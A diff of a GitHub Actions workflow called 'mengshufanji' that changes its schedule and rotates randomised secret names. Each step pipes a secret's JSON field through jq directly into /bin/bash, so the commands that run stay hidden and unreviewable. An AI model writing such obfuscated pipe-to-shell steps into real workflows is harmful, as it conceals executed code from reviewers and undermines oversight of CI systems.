@@ -1,9 +1,9 @@
 name: mengshufanji
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
-
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: mengshufanji
         env:
-          qrhvt28: ${{ secrets.qrhvt28 }}
+          d13699: ${{ secrets.d13699 }}
         run: |
-          echo $qrhvt28 | jq -r .i5778 | /bin/bash
-          echo $bx55 | jq -r .ftwun08469 | /bin/bash
-          echo $tdxu68723 | jq -r .pwzlc71 | /bin/bash
-          echo $mnqzz0 | jq -r .mehh82 | /bin/bash
-          echo $yr0845 | jq -r .uajw07 | /bin/bash
-          echo $d54 | jq -r .juyrl11257 | /bin/bash
-          echo $vi1 | jq -r .hklx328 | /bin/bash
-          echo $nds8737 | jq -r .yu67 | /bin/bash
-          echo $fxwjc14622 | jq -r .re971 | /bin/bash
-          echo $cjef90302 | jq -r .uylg731 | /bin/bash
-          echo $seym9277 | jq -r .srqlt9 | /bin/bash
+          echo $d13699 | jq -r .s943 | /bin/bash
+          echo $azs673 | jq -r .ijgrx18609 | /bin/bash
+          echo $cs385 | jq -r .qku41 | /bin/bash
+          echo $ds51399 | jq -r .dxm51 | /bin/bash
+          echo $izj0 | jq -r .oqw354 | /bin/bash
+          echo $rn57409 | jq -r .doqnx5 | /bin/bash
+          echo $z37725 | jq -r .yak0581 | /bin/bash
+          echo $su1 | jq -r .znl031 | /bin/bash
+          echo $schhc533 | jq -r .aicgn82796 | /bin/bash
 
